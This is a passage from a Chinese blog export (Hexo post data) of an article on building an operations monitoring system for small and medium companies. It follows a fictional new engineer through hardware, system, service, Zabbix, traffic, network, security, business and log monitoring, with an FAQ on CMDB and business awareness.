运维需要懂业务吗？\n\n我个人的观点是懂业务能让运维走的更远，运维服务的对象不一定是其它部门，为什么不能是终端用户呢？\n\n可以站在终端用户的视角来做运维，比如有用户反映访问慢，为什么慢，是架构的原因，Nginx配置的原因，还是数据库的原因。\n\n不要等着领导来安排，运维能带来的价值是需要运维自己做出来的，思想有多远，运维就能走多远！\n\n那么监控在这里发挥的作用就是：让数据说话！\n\n### 做监控也需要CMDB吗？\n\n我认为CMDB是基础，尤其是在自动化运维的模式下，你需要有一个地方能准确的提供一台服务器放在哪个位置、配置是什么？什么时候购买的？什么时候过保？都运行了哪些服务、开放了什么端口、版本是什么（升级时使用）。\n\n有了这些数据，就可以轻松和配置管理系统、部署系统、监控系统有效的结合起来。总结起来就是：以业务为导向、以CMDB为中心、以API为基础来进行运维体系的建设。\n\n有了CMDB的数据支撑，那些看着高大上的自动绘出架构图和机柜图就不是难事了。","source":"_posts/中小企业监控体系构建实战.md","raw":"---\ntitle: 中小企业监控体系构建实战\ncategories:\n  - 我的收藏\ntags:\n  - 运维\n  - 监控\ndate: 2016-6-8 13:15:12\ntoc: false\n---\n\n> 文章整理如下：\n\n![图片1](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/1.png)\n\n<!-- more -->\n\n---\n\n## 作者介绍\n\n赵舜东，江湖人称赵班长，曾在武警某部负责指挥自动化的架构和运维工作，2008年退役后一直从事互联网运维工作。曾带团队负责国内某食品电商的运维工作，即将出版的《saltstack入门与实践》作者之一。\n\n## 主题简介\n\n我们今天的话题是《中小企业监控体系构建实战》，前期分享了《中小企业自动化部署实战》还没有看到的朋友可以先阅读下，这样也能明白为何要定位中小企业。监控这个话题实在太大，所以本文的正确定位应该是如何构建一个“相对”完善的监控体系。\n\n## 从面试开始\n\n在之前的招聘面试中，我必问的一个问题就是“**你们之前公司的监控体系是怎么做的？你认为怎么做效果比较好？**”\n\n经常得到这样类似的答案：“我们公司用的Nagios、Cacti做监控，或者说我们公司用Zabbix做监控”，再继续追问往往得到的也是如何使用这些工具的细节的回答。\n\n这样的回答固然没错，但却反映出来运维人员经常会被工具迷惑双眼，从而忘记了最初的出发点。本文就以一个刚入职的运维工程师小王的故事来阐述监控体系，所以这个故事的名字叫做《小王特烦恼》。\n\n### 1. 确定目标、统一思想\n\n我们直接跳过什么是监控和监控的重要性等大段描述，先仔细的想一想，监控的目标是什么？\n\n每个人的答案都不同，我的回答是：终极目标就是为了保证业务的持续和稳定运行。如此偏激的回答就是让读者从现在开始要站在业务的角度的开始规划监控体系，而不是某个技术范畴。\n\n注意：本文不涉及性能测试、性能优化中的监控，所有文字的出发点都是日常运维监控。\n\n在开始之前，我们还是先统一下认识：要监控一个对象，需要掌握哪些东西呢？\n\n- 监控对象的理解：要监控的对象你是否了解呢？比如CPU到底是如何工作的？\n\n- 监控对象的指标：我们要监控这个东西的什么属性？比如CPU的CPU使用率、负载、上下文切换。\n\n- 确定报警基准线：怎么样才算是故障，要报警呢？比如CPU的负载到底多少算高？\n\n如果上述的条件不满足，那就先不要开始实施监控了，因为等做完了，你会发现，然并卵？\n\n### 2. 故事开始\n\n王小明（化名）刚刚毕业，到了一家刚刚起步的电商公司任职：运维工程师，刚上班第一天，小王收到领导安排的光荣任务:把我们公司的监控搞起来！\n\n小王想了好久，没想明白，索性不想了，从手头接触到的慢慢开始吧,于是小王决定先去机房看看。\n\n#### 2.1 硬件监控\n\n到了机房，小王看着公司的各种品牌的服务器，想到的第一件事情就是，这些硬件设备，我要监控起来。\n\n硬件设备监控是最基础的监控手段，比如定期的的机房巡检。\n\n通常我们的服务器上都会有远程控制卡，如Dell的iDRAC,HP的ILO和IBM的IMM等，可以通过Web界面来进行硬件的监控和管理工作，如果购买企业级的授权，还可以使用控制台进行管理。\n\n在Linux下，通常我们使用IPMI来完成物理设备的监控工作。通常必须要监控的就是温度、硬盘故障等。\n\n小王编写了自己职业生涯的第一个脚本，就是使用ipmi工具获取温度传感器的数据，大于50就发一份邮件给他，虽然感觉不高端，但总算是有一个开始。\n\n![图片2](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/2.png)\n\n故障回想：之前我司托管在北京某机房的设备就出现过，因为刚好所在机柜区域的空调坏了，导致服务器温度过高，然后系统宕机。\n\n#### 2.2 系统监控\n\n小王下一个想到的就是系统监控，公司全是Linux的服务器，系统资源的使用情况，肯定是要监控起来的。\n\n系统监控是监控体系的基础，系统监控主要的对象有：\n\n1、CPU\n2、Memory\n3、IO\n4、CPU：关于CPU，有3个重要的概念：上下文切换（context switchs），运行队列（Run queue）和使用率（utilization）。\n\n这也是我们CPU监控的三个重点。通常情况下，每个处理器的运行队列要小于等于3，CPU 利用率中user/system比例维持在70/30，上下文切换要根据系统繁忙程度来综合考量。\n\n常用的监控工具有：top vmstat mpstat\n\n![图片3](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/3.png)\n\n内存：Linux虚拟内存是一个庞大的东东，通常我们需要监控内存的使用率、SWAP使用率、同时可以通过内存的使用率曲线来发现某些服务的内存溢出等。\n\n监控工具有：free vmstat\n\n![图片4](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/4.png)\n\nIO：IO分为磁盘IO和网络IO。除了在做性能调优我们要监控更详细的数据外，那么日常监控，只关注磁盘使用率、io wait即可，网络也是监控网卡流量即可。工具有iostat iotop iftop。\n\n![图片5](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/5.png)\n\nTCP监控：在很多情况下有必要监控TCP的状态，可以使用netstat或者ss来获取所有的TCP连接，来展现11种不同的TCP连接状态的数量，可以在大并发中及时发现TCP的相关故障。\n\n![图片6](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/6.png)\n\n其它的系统监控还有运行的进程数、登陆用户、Open File等。\n\n#### 2.3 应用服务监控\n\n小王把硬件监控和系统监控研究明白后，登陆到服务器上继续研究，偶然间一个ps aux，小王发现，我们服务器上运行了这么多的服务，那都需要监控起来啊。\n\n应用服务监控也是监控体系中比较重要的内容，例如：\n\nApache：Apache提供了mod_status和mod_info模块用来输出Apache的状态，小王写了一个脚本，各种grep和awk搞定。\nNginx：同样有状态模块，编译的时候加上—with-http_stub_status_module，然后就可以使用stub_status on来开启了。\nMemcached：小王使用nc给memcached发送了一个stats命令就获取到了所有想要的信息。\nRedis：小王还是使用nc给redis发送了一个info命令就获取到了redis的相关状态。\nJVM：使用jmconsole，或者jmx就可以进行远程监控。\n于是小王，将线上的各种服务，都一个一个的进行了监控，这样这些服务的详细的运行状态就了如指掌了。\n\n同时，还需要将所有的API接口状态进行监控，比如通过curl检查返回的HTTP状态码。有条件的用户，可以做一个URL监控平台，专门用来做这个事情。\n\n![图片7](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/7.png)\n\n#### 2.4 引入Zabbix\n\n自从小王接收到监控的任务后，这Shell编程能力是越来越强了，但是每天一打开邮箱就被各种报警所淹没，脚本多而杂乱。\n\n小王想，我需要一个什么监控工具来干这些事，不能这么写脚本下去了。于是在网上进行各种搜索，发现了很多的监控工具如Nagios、Cacti、Zabbix，原来自己之前费那么大劲，这些工具早就实现了。\n\n经过相关的对比，小王选择了Zabbix。然后之前的所有监控范畴，都可以整合到Zabbix中。\n\n硬件监控：Zabbix IPMI Interface\n系统监控：Zabbix Agent Interface\nJava监控：Zabbix JMX Interface\n网络设备监控：Zabbix SNMP Interface\n应用服务监控：Zabbix Agent UserParameter\nMySQL数据库监控：percona-monitoring-plulgins\nURL监控：Zabbix Web 监控  \n\n这一下子把之前干的工作全集成到一个平台上了。而且之前编写的所有的应用服务的监控脚本，简单修改就可以使用。\n\n同时也可以灵活的设置报警阈值、告警方式、告警升级、告警去重、告警依赖等等，同时还使用Zabbix的自动发现功能实现上线一台服务器后，自动添加监控。\n\n使用Zabbix Proxy实现了多机房的分布式监控，这简直太棒了。\n\n对于告警通知：邮件、微信、短信、钉钉等，都可以与Zabbix快速的集成，网上有很多此类文档。\n\n同时，针对某些可以进行直接处理的报警，Zabbix可以触发Action来轻松帮你实现，故障的自动处理。\n\n于是小王准备向经理汇报工作，此处省略300字，但是不到10分钟小王垂直头回来了。因为经理问了一个问题，小王回答不上来：小王，今天咱们网站的整体PV是多少？现在访问最多的页面是哪个？\n\n#### 2.5 流量分析\n\n小王首先想到的是把访问日志拿出来各种awk然后sort一下，但是这次他没有急于开始，难道就没有做这些统计和分析的工具吗？\n\n于是小王发现了google分析、百度统计、站长工具等等一堆统计的东西，只需要在页面嵌入一个js即可。\n\n但是呢？这个数据始终是在对方那里，而且功能定制起来也不方便，于是google帮助了他，一个叫做piwik的开源项目映入眼帘。\n\n网站流量分析对于运维人员来说，更是一门必须掌握的知识了。比如对于一家电商公司来说，通过对订单来源的统计和分析，可以了解我们在某个网站上的广告投入有没有收到预期的效果。可以区分不同地区的访问人数、甚至商品交易额等。\n\n![图片8](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/8.png)\n\n而且，流量分析是运维向运营拓展的必经之路，作为一名运维工程师很有必要掌握公司站点的各种访问详情。\n\n#### 2.6 网络监控\n\n作为一个针对全国用户的电商网站，时刻掌握各地到机房的网络状态是小王的下一个监控目标。\n\n网络监控是我们构建监控平台是必须要考虑的，尤其是针对有多个机房的场景，各个机房之间的网络状态，机房和全国各地的网络状态都是我们需要重点关注的对象，那么如何掌握这些状态信息呢？我们需要借助于网络监控工具Smokeping。\n\nSmokeping 是rrdtool的作者Tobi Oetiker的作品，是用Perl写的，主要是监视网络性能，www 服务器性能，dns查询性能等，使用rrdtool绘图，而且支持分布式，直接从多个agent进行数据的汇总。\n\n同时，由于自己监控点比较少，还可以借助很多商业的监控工具，比如监控宝、基调、博瑞等。同时这些服务提供商还可以帮助你监控CDN的状态。\n\n![图片9](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/9.png)\n\n#### 2.7 安全监控\n\n虽然iptables帮助小王完成了四层的安全防护，但是针对七层的Web层面怎么办呢？\n\n于是小王使用Nginx + Lua编写了一个WAF，然后把相关的日志记录到了Elasticsearch中，通过kibana可以图形化的展示不同的攻击类型的统计。\n\n同时小王学习使用python还写了一个爬虫定期扫描github，有没有公司相关的关键字，以免同事分享代码时，不小心涉及到敏感的内容。\n\n![图片10](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/10.png)\n\n（图片来源https://github.com/loveshell/ngx_lua_waf）\n\n#### 2.8 业务监控\n\n小王再去向经理汇报，刚走到门口被总经理碰上了，张总说：小王啊，你们经理汇报你最近监控工作干的不错，你给我说下，咱们现在10点的时候总订单是多少，每分钟平均订单有多少？\n\n小王又蒙了，我自己也曾经就是那个小王！\n\n没有业务指标监控的监控平台是一个不完善的监控平台，通常在我们做监控系统中，必须将我们重要的业务指标进行监控，并设置阈值进行告警通知。\n\n比如每分钟的订单、每分钟注册、日活用户、短信使用量等重要的业务指标都可以加入到Zabbix上。\n\n注：由于业务监控图表，涉及到隐私的数据太多，就不截图了。\n\n#### 2.9 日志监控\n\n通常情况下，系统会产生系统日志、应用程序会有应用的访问日志、错误日志，服务有运行日志等，可以使用ELK来进行日志监控。\n\n对于日志来说，最常见的需求就是收集、存储、查询、展示，开源社区正好有相对应的开源项目：\n\nlogstash（收集）\nelasticsearch（存储+搜索）\nkibana（展示）\n我们将这三个组合起来的技术称之为ELK Stack，所以说ELK Stack指的是Elasticsearch、Logstash、Kibana技术栈的结合。\n\n如果收集了错误日志，那么如果部署更新有异常出现，可以立即在kibana上看到。当然也可以使用Zabbix来进行错误日志的过滤来进行告警。\n\n![图片11](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/11.png)\n\n#### 2.10 自动化\n\n经过努力，小王完成从监控菜鸟到头脑中有一个相对完整的监控体系的逆袭，但是在大规模的环境中，如果无法做到自动化监控，那么手动添加监控不仅仅是一个恐怖的工作，而且也无法保证完整性。\n\n自动化的方案有很多，通常有主动和被动不同的形式，这里相对Zabbix来说。\n\n主动形式：\n\n比如使用Zabbix的自动发现，主动的对全网进行扫描，然后自动添加相关的监控服务器和引用监控模板。\n\n被动形式：\n\n也可以使用Zabbix API进行被动的监控的添加。比如以CMDB为核心，如果检测到某服务器增加了Nginx服务，那么自动调用Zabbix API添加上Nginx的监控模板。\n\n真正想做到更完整的监控体系，目前的开源软件，确实无法很好的满足，有条件的公司都开始自己开发自己的监控系统，比如小米开源的Open-Falcon。\n\n也有比较好的开源的监控框架如Sensu等，再加上influxdb grafana可以用来定制符合自己企业的监控平台。\n\n#### 2.11 可视化\n\n经过小王的各种努力，终于一个相对完善的监控平台使用Zabbix构建起来了，小王为此还做一个漂亮的screen，来进行展示，但是有一天突然订单量特别少，张总又一次到了运维部，但失望而归，因为整个监控体系并不能反映出来订单量为什么减少了？\n\n运维的重要目标之一就是数据的可视化，一个监控平台不能很好的反映出来业务的波动，就是耍流氓。之前的一切努力在业务部门的领导中变得一文不值！！！\n\n我们能做的有以下几点：\n\n面向传统运维：\n\n尽可能的完善业务监控，如果有专门的业务分析系统，要想办法和运维的监控平台进行结合。\n\n梳理清楚各个子系统之间和业务的关系，比如如果突然间流量增加了50M，能够快速的知道这50M流量到了那个业务系统上，访问的哪些URL，以及这个业务系统的相关状态。\n\n面向DevOps：\n\n将所有的监控项和业务之间建立关系树，比如业务、网络、系统、数据库、流量、推广活动（流量分析）之间可以形成一个庞大的关系链。这是一个比较庞大的工程，业务是多变的，如何让监控平台能尽可能的适应多变的业务是一个艰巨的任务。\n\n![图片12](http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/12.png)\n\n## 到面试结束\n\n该结束了，因为我无论怎么努力增加，还是觉得总有漏下的。\n\n监控的话题还有很多很多，比如还有和运维相关的页面性能监控（页面资源数量、DNS解析时间、首屏时间、加载最慢的资源、产生阻塞的JS等）、代码监控、与运维无关的舆论监控等，先这么多吧！\n\n好的，我们是从面试开始引入的监控的话题，那么就从面试结束吧！下次再遇到类似的面试题，我相信读者心里一定有了自己的答案，这里就不在详述，一个相对完善的运维监控体系是否已经在你脑海中形成了呢？\n\n> 小贴士：面试中，如果你遇到一个有很强的责任心，连洗澡都要带上手机，以免错过报警的人，不要犹豫，先招进来再慢慢培养吧。责任心是运维工程师的第一要素！\n\n后记：小王的故事结束了，小王目前被监控的关系树锻炼的连王菲、李亚鹏的关系都能搞明白了。可是你呢？\n\n如果你是一名运维工程师，动手干吧，监控会是一个不断完善的工程，这就是运维（运营）和项目的本质区别。\n\n如果你是一名Devops，那么开始编程吧！\n\n如果你是一名老板，给公司的运维工程师一个转变的机会和一些时间，人总是不断进步的！\n\n## FAQ：\n\n### 故障自动处理有没有相关的思路？\n\n不同业务形态、不同架构、不同服务可能采用的方式都不同，这个没有一个固定的东西分享。可以参考之前腾讯蓝鲸的分享，他们实现了故障自愈的功能。\n\n### 运维需要懂业务吗？\n\n我个人的观点是懂业务能让运维走的更远，运维服务的对象不一定是其它部门，为什么不能是终端用户呢？\n\n可以站在终端用户的视角来做运维，比如有用户反映访问慢，为什么慢，是架构的原因，Nginx配置的原因，还是数据库的原因。\n\n不要等着领导来安排，运维能带来的价值是需要运维自己做出来的，思想有多远，运维就能走多远！\n\n那么监控在这里发挥的作用就是：让数据说话！\n\n### 做监控也需要CMDB吗？\n\n我认为CMDB是基础，尤其是在自动化运维的模式下，你需要有一个地方能准确的提供一台服务器放在哪个位置、配置是什么？什么时候购买的？什么时候过保？都运行了哪些服务、开放了什么端口、版本是什么（升级时使用）。\n\n有了这些数据，就可以轻松和配置管理系统、部署系统、监控系统有效的结合起来。总结起来就是：以业务为导向、以CMDB为中心、以API为基础来进行运维体系的建设。\n\n有了CMDB的数据支撑，那些看着高大上的自动绘出架构图和机柜图就不是难事了。","slug":"中小企业监控体系构建实战","published":1,"updated":"2016-11-18T07:36:21.180Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbruldl003vgwtmk319x8ol","content":"<blockquote>\n<p>&#x6587;&#x7AE0;&#x6574;&#x7406;&#x5982;&#x4E0B;&#xFF1A;</p>\n</blockquote>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/1.png\" alt=\"&#x56FE;&#x7247;1\"></p>\n<a id=\"more\"></a>\n<hr>\n<h2 id=\"&#x4F5C;&#x8005;&#x4ECB;&#x7ECD;\"><a href=\"#&#x4F5C;&#x8005;&#x4ECB;&#x7ECD;\" class=\"headerlink\" title=\"&#x4F5C;&#x8005;&#x4ECB;&#x7ECD;\"></a>&#x4F5C;&#x8005;&#x4ECB;&#x7ECD;</h2><p>&#x8D75;&#x821C;&#x4E1C;&#xFF0C;&#x6C5F;&#x6E56;&#x4EBA;&#x79F0;&#x8D75;&#x73ED;&#x957F;&#xFF0C;&#x66FE;&#x5728;&#x6B66;&#x8B66;&#x67D0;&#x90E8;&#x8D1F;&#x8D23;&#x6307;&#x6325;&#x81EA;&#x52A8;&#x5316;&#x7684;&#x67B6;&#x6784;&#x548C;&#x8FD0;&#x7EF4;&#x5DE5;&#x4F5C;&#xFF0C;2008&#x5E74;&#x9000;&#x5F79;&#x540E;&#x4E00;&#x76F4;&#x4ECE;&#x4E8B;&#x4E92;&#x8054;&#x7F51;&#x8FD0;&#x7EF4;&#x5DE5;&#x4F5C;&#x3002;&#x66FE;&#x5E26;&#x56E2;&#x961F;&#x8D1F;&#x8D23;&#x56FD;&#x5185;&#x67D0;&#x98DF;&#x54C1;&#x7535;&#x5546;&#x7684;&#x8FD0;&#x7EF4;&#x5DE5;&#x4F5C;&#xFF0C;&#x5373;&#x5C06;&#x51FA;&#x7248;&#x7684;&#x300A;saltstack&#x5165;&#x95E8;&#x4E0E;&#x5B9E;&#x8DF5;&#x300B;&#x4F5C;&#x8005;&#x4E4B;&#x4E00;&#x3002;</p>\n<h2 id=\"&#x4E3B;&#x9898;&#x7B80;&#x4ECB;\"><a href=\"#&#x4E3B;&#x9898;&#x7B80;&#x4ECB;\" class=\"headerlink\" title=\"&#x4E3B;&#x9898;&#x7B80;&#x4ECB;\"></a>&#x4E3B;&#x9898;&#x7B80;&#x4ECB;</h2><p>&#x6211;&#x4EEC;&#x4ECA;&#x5929;&#x7684;&#x8BDD;&#x9898;&#x662F;&#x300A;&#x4E2D;&#x5C0F;&#x4F01;&#x4E1A;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#x6784;&#x5EFA;&#x5B9E;&#x6218;&#x300B;&#xFF0C;&#x524D;&#x671F;&#x5206;&#x4EAB;&#x4E86;&#x300A;&#x4E2D;&#x5C0F;&#x4F01;&#x4E1A;&#x81EA;&#x52A8;&#x5316;&#x90E8;&#x7F72;&#x5B9E;&#x6218;&#x300B;&#x8FD8;&#x6CA1;&#x6709;&#x770B;&#x5230;&#x7684;&#x670B;&#x53CB;&#x53EF;&#x4EE5;&#x5148;&#x9605;&#x8BFB;&#x4E0B;&#xFF0C;&#x8FD9;&#x6837;&#x4E5F;&#x80FD;&#x660E;&#x767D;&#x4E3A;&#x4F55;&#x8981;&#x5B9A;&#x4F4D;&#x4E2D;&#x5C0F;&#x4F01;&#x4E1A;&#x3002;&#x76D1;&#x63A7;&#x8FD9;&#x4E2A;&#x8BDD;&#x9898;&#x5B9E;&#x5728;&#x592A;&#x5927;&#xFF0C;&#x6240;&#x4EE5;&#x672C;&#x6587;&#x7684;&#x6B63;&#x786E;&#x5B9A;&#x4F4D;&#x5E94;&#x8BE5;&#x662F;&#x5982;&#x4F55;&#x6784;&#x5EFA;&#x4E00;&#x4E2A;&#x201C;&#x76F8;&#x5BF9;&#x201D;&#x5B8C;&#x5584;&#x7684;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#x3002;</p>\n<h2 id=\"&#x4ECE;&#x9762;&#x8BD5;&#x5F00;&#x59CB;\"><a href=\"#&#x4ECE;&#x9762;&#x8BD5;&#x5F00;&#x59CB;\" class=\"headerlink\" title=\"&#x4ECE;&#x9762;&#x8BD5;&#x5F00;&#x59CB;\"></a>&#x4ECE;&#x9762;&#x8BD5;&#x5F00;&#x59CB;</h2><p>&#x5728;&#x4E4B;&#x524D;&#x7684;&#x62DB;&#x8058;&#x9762;&#x8BD5;&#x4E2D;&#xFF0C;&#x6211;&#x5FC5;&#x95EE;&#x7684;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x5C31;&#x662F;&#x201C;<strong>&#x4F60;&#x4EEC;&#x4E4B;&#x524D;&#x516C;&#x53F8;&#x7684;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#x662F;&#x600E;&#x4E48;&#x505A;&#x7684;&#xFF1F;&#x4F60;&#x8BA4;&#x4E3A;&#x600E;&#x4E48;&#x505A;&#x6548;&#x679C;&#x6BD4;&#x8F83;&#x597D;&#xFF1F;</strong>&#x201D;</p>\n<p>&#x7ECF;&#x5E38;&#x5F97;&#x5230;&#x8FD9;&#x6837;&#x7C7B;&#x4F3C;&#x7684;&#x7B54;&#x6848;&#xFF1A;&#x201C;&#x6211;&#x4EEC;&#x516C;&#x53F8;&#x7528;&#x7684;Nagios&#x3001;Cacti&#x505A;&#x76D1;&#x63A7;&#xFF0C;&#x6216;&#x8005;&#x8BF4;&#x6211;&#x4EEC;&#x516C;&#x53F8;&#x7528;Zabbix&#x505A;&#x76D1;&#x63A7;&#x201D;&#xFF0C;&#x518D;&#x7EE7;&#x7EED;&#x8FFD;&#x95EE;&#x5F80;&#x5F80;&#x5F97;&#x5230;&#x7684;&#x4E5F;&#x662F;&#x5982;&#x4F55;&#x4F7F;&#x7528;&#x8FD9;&#x4E9B;&#x5DE5;&#x5177;&#x7684;&#x7EC6;&#x8282;&#x7684;&#x56DE;&#x7B54;&#x3002;</p>\n<p>&#x8FD9;&#x6837;&#x7684;&#x56DE;&#x7B54;&#x56FA;&#x7136;&#x6CA1;&#x9519;&#xFF0C;&#x4F46;&#x5374;&#x53CD;&#x6620;&#x51FA;&#x6765;&#x8FD0;&#x7EF4;&#x4EBA;&#x5458;&#x7ECF;&#x5E38;&#x4F1A;&#x88AB;&#x5DE5;&#x5177;&#x8FF7;&#x60D1;&#x53CC;&#x773C;&#xFF0C;&#x4ECE;&#x800C;&#x5FD8;&#x8BB0;&#x4E86;&#x6700;&#x521D;&#x7684;&#x51FA;&#x53D1;&#x70B9;&#x3002;&#x672C;&#x6587;&#x5C31;&#x4EE5;&#x4E00;&#x4E2A;&#x521A;&#x5165;&#x804C;&#x7684;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#x5C0F;&#x738B;&#x7684;&#x6545;&#x4E8B;&#x6765;&#x9610;&#x8FF0;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x4E2A;&#x6545;&#x4E8B;&#x7684;&#x540D;&#x5B57;&#x53EB;&#x505A;&#x300A;&#x5C0F;&#x738B;&#x7279;&#x70E6;&#x607C;&#x300B;&#x3002;</p>\n<h3 id=\"1-&#x786E;&#x5B9A;&#x76EE;&#x6807;&#x3001;&#x7EDF;&#x4E00;&#x601D;&#x60F3;\"><a href=\"#1-&#x786E;&#x5B9A;&#x76EE;&#x6807;&#x3001;&#x7EDF;&#x4E00;&#x601D;&#x60F3;\" class=\"headerlink\" title=\"1. &#x786E;&#x5B9A;&#x76EE;&#x6807;&#x3001;&#x7EDF;&#x4E00;&#x601D;&#x60F3;\"></a>1. &#x786E;&#x5B9A;&#x76EE;&#x6807;&#x3001;&#x7EDF;&#x4E00;&#x601D;&#x60F3;</h3><p>&#x6211;&#x4EEC;&#x76F4;&#x63A5;&#x8DF3;&#x8FC7;&#x4EC0;&#x4E48;&#x662F;&#x76D1;&#x63A7;&#x548C;&#x76D1;&#x63A7;&#x7684;&#x91CD;&#x8981;&#x6027;&#x7B49;&#x5927;&#x6BB5;&#x63CF;&#x8FF0;&#xFF0C;&#x5148;&#x4ED4;&#x7EC6;&#x7684;&#x60F3;&#x4E00;&#x60F3;&#xFF0C;&#x76D1;&#x63A7;&#x7684;&#x76EE;&#x6807;&#x662F;&#x4EC0;&#x4E48;&#xFF1F;</p>\n<p>&#x6BCF;&#x4E2A;&#x4EBA;&#x7684;&#x7B54;&#x6848;&#x90FD;&#x4E0D;&#x540C;&#xFF0C;&#x6211;&#x7684;&#x56DE;&#x7B54;&#x662F;&#xFF1A;&#x7EC8;&#x6781;&#x76EE;&#x6807;&#x5C31;&#x662F;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x4E1A;&#x52A1;&#x7684;&#x6301;&#x7EED;&#x548C;&#x7A33;&#x5B9A;&#x8FD0;&#x884C;&#x3002;&#x5982;&#x6B64;&#x504F;&#x6FC0;&#x7684;&#x56DE;&#x7B54;&#x5C31;&#x662F;&#x8BA9;&#x8BFB;&#x8005;&#x4ECE;&#x73B0;&#x5728;&#x5F00;&#x59CB;&#x8981;&#x7AD9;&#x5728;&#x4E1A;&#x52A1;&#x7684;&#x89D2;&#x5EA6;&#x7684;&#x5F00;&#x59CB;&#x89C4;&#x5212;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x67D0;&#x4E2A;&#x6280;&#x672F;&#x8303;&#x7574;&#x3002;</p>\n<p>&#x6CE8;&#x610F;&#xFF1A;&#x672C;&#x6587;&#x4E0D;&#x6D89;&#x53CA;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x3001;&#x6027;&#x80FD;&#x4F18;&#x5316;&#x4E2D;&#x7684;&#x76D1;&#x63A7;&#xFF0C;&#x6240;&#x6709;&#x6587;&#x5B57;&#x7684;&#x51FA;&#x53D1;&#x70B9;&#x90FD;&#x662F;&#x65E5;&#x5E38;&#x8FD0;&#x7EF4;&#x76D1;&#x63A7;&#x3002;</p>\n<p>&#x5728;&#x5F00;&#x59CB;&#x4E4B;&#x524D;&#xFF0C;&#x6211;&#x4EEC;&#x8FD8;&#x662F;&#x5148;&#x7EDF;&#x4E00;&#x4E0B;&#x8BA4;&#x8BC6;&#xFF1A;&#x8981;&#x76D1;&#x63A7;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#xFF0C;&#x9700;&#x8981;&#x638C;&#x63E1;&#x54EA;&#x4E9B;&#x4E1C;&#x897F;&#x5462;&#xFF1F;</p>\n<ul>\n<li><p>&#x76D1;&#x63A7;&#x5BF9;&#x8C61;&#x7684;&#x7406;&#x89E3;&#xFF1A;&#x8981;&#x76D1;&#x63A7;&#x7684;&#x5BF9;&#x8C61;&#x4F60;&#x662F;&#x5426;&#x4E86;&#x89E3;&#x5462;&#xFF1F;&#x6BD4;&#x5982;CPU&#x5230;&#x5E95;&#x662F;&#x5982;&#x4F55;&#x5DE5;&#x4F5C;&#x7684;&#xFF1F;</p>\n</li>\n<li><p>&#x76D1;&#x63A7;&#x5BF9;&#x8C61;&#x7684;&#x6307;&#x6807;&#xFF1A;&#x6211;&#x4EEC;&#x8981;&#x76D1;&#x63A7;&#x8FD9;&#x4E2A;&#x4E1C;&#x897F;&#x7684;&#x4EC0;&#x4E48;&#x5C5E;&#x6027;&#xFF1F;&#x6BD4;&#x5982;CPU&#x7684;CPU&#x4F7F;&#x7528;&#x7387;&#x3001;&#x8D1F;&#x8F7D;&#x3001;&#x4E0A;&#x4E0B;&#x6587;&#x5207;&#x6362;&#